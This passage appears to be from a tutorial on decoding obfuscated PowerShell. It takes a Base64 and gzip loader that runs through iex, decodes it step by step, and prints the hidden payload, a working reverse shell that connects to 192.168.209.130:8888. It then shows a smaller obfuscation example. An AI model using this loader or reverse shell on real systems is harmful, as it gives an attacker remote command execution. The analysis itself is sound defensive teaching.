$Decoded = [System.Convert]::FromBase64String("H4sIAAAAAAAEAE1RX2vCMBD/KvfQrQmzoe1Q1DJhK9sQhsoq7EF8iO1hM2sVe6Kifvclre3Myx3H799drDhTmBO8wAgPznjxizFBdCoI12K
EJKJNvEIqxDSchCWS2V7PF16nK3y3J7xn12519eOBVdAO5VorWZWm+ESKyhnjwWxxIpzN55aphQa5QnTa7ef25eHsXoNDqjJkzFKGXgmJb5QJq/AtcFtQteIL8yWlnIOTI7j8HFiJJKl57G4DZ3ra4kius
d5likcSr1E4HL7n8SZR+ZLf8um2djEmymyCebKQ8cqIKjxC5eAPHj24wHhPTkWDO6gPZfKa+AT2JAJbV7Y9JFxMJKVmOAD7xtGGRn5GJhjeMs37/TJjme3NZGL/Ds2Jxc9OEbJGR+du+vo8DfYj2xcp49e
g/pUw2xTI+B98Oi3S+QEAAA==");$ms = (New-Object System.IO.MemoryStream($Decoded,0,$Decoded.Length));iex(New-Object System.IO.StreamReader(New-Object System.
IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))).readtoend()
```
There is a lot of information presented to us here, but let's take advantage of the semi-colons and break this into a multi-line script for readability:

```PowerShell
$Decoded = [System.Convert]::FromBase64String("H4sIAAAAAAAEAE1RX2vCMBD/KvfQrQmzoe1Q1DJhK9sQhsoq7EF8iO1hM2sVe6Kifvclre3Myx3H799drDhTmBO8wAgPznjxizFBdCoI12KEJKJNvEIqxDSchCWS2V7PF16nK3y3J7xn12519eOBVdAO5VorWZWm+ESKyhnjwWxxIpzN55aphQa5QnTa7ef25eHsXoNDqjJkzFKGXgmJb5QJq/AtcFtQteIL8yWlnIOTI7j8HFiJJKl57G4DZ3ra4kiusd5likcSr1E4HL7n8SZR+ZLf8um2djEmymyCebKQ8cqIKjxC5eAPHj24wHhPTkWDO6gPZfKa+AT2JAJbV7Y9JFxMJKVmOAD7xtGGRn5GJhjeMs37/TJjme3NZGL/Ds2Jxc9OEbJGR+du+vo8DfYj2xcp49eg/pUw2xTI+B98Oi3S+QEAAA==");
$ms = (New-Object System.IO.MemoryStream($Decoded,0,$Decoded.Length));
iex(New-Object System.IO.StreamReader(New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))).readtoend()
```
We can see here that the script is decoding a Base64 string and it's passing that variable to a MemoryStream object. From here, it's invoking the results of the decompress method. The dangerous part of this script is the Invoke-Expression alias, iex. We need to avoid that command as it will execute the command and we will won't see the actual script.

We can defeat this by executing each stage of the decoder, whilst replacing iex and appending the script with out-string, revealing the contents, specifically our reverse shell script:

```PowerShell
PS C:\> $Decoded = [System.Convert]::FromBase64String("H4sIAAAAAAAEAE1RX2vCMBD/KvfQrQmzoe1Q1DJhK9sQhsoq7EF8iO1hM2sVe6Kifvclre3Myx3H799drDhTmBO8wAgPznjxizFBdCoI12KEJKJNvEIqxDSchCWS2V7PF16nK3y3J7xn12519eOBVdAO5VorWZWm+ESKyhnjwWxxIpzN55aphQa5QnTa7ef25eHsXoNDqjJkzFKGXgmJb5QJq/AtcFtQteIL8yWlnIOTI7j8HFiJJKl57G4DZ3ra4kiusd5likcSr1E4HL7n8SZR+ZLf8um2djEmymyCebKQ8cqIKjxC5eAPHj24wHhPTkWDO6gPZfKa+AT2JAJbV7Y9JFxMJKVmOAD7xtGGRn5GJhjeMs37/TJjme3NZGL/Ds2Jxc9OEbJGR+du+vo8DfYj2xcp49eg/pUw2xTI+B98Oi3S+QEAAA==");
PS C:\> $ms = (New-Object System.IO.MemoryStream($Decoded,0,$Decoded.Length));
PS C:\> (New-Object System.IO.StreamReader(New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))).readtoend() | Out-String
$client = New-Object System.Net.Sockets.TCPClient('192.168.209.130',8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream
.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Ou
t-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendby
te.Length);$stream.Flush()};$client.Close()
```

When it comes to obfuscation, it's intention is to make it harder to detect and respond to malicious activity. This particular technique focuses on just compression and as I showed, its relatively simple once you’re shown how to do it. 

You will come across even more sophisticated forms of obfuscation on your journey. Everything from functions, variables, strings, etc. This is all fair game and is designed to confuse you and your security platforms. Like this for example:

```PowerShell
#Before
'Write-Output "Hello, Friend"' | iex

#After
[sTring]::JoIn('', ( (87,114,105,116,101,45,79,117,116,112,117,116,32,34,72,101,108,108,111,44,32,70,114,105,101,110,100,34) |%{ ( [Char][iNT] $_)})) | & ((gv '*MDr*').Name[3,11,2]-jOIn'')

```

Take one of your own scripts, or an arbitrary string and using the steps presented here, see what other techniques you can add to obfuscate them further. Write yourself some procedures on how you can decode them safely. Be informed, be secure!

## Resources
1. https://docs.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Core/About/about_PowerShell_exe?view=powershell-5.1
2. https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1528488611.pdf
